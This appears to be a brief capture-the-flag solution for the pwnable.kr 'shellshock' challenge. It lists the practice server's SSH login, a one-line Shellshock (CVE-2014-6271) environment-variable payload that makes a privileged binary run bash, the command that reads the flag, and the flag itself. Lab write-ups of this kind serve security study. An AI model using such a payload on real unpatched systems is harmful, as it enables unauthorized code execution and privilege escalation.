ssh shellshock@pwnable.kr -p2222 (pw:guest)


`env -i x='() { :;}; ./bash;' ./shellshock`
`cat flag`

flag: only if I knew CVE-2014-6271 ten years ago..!!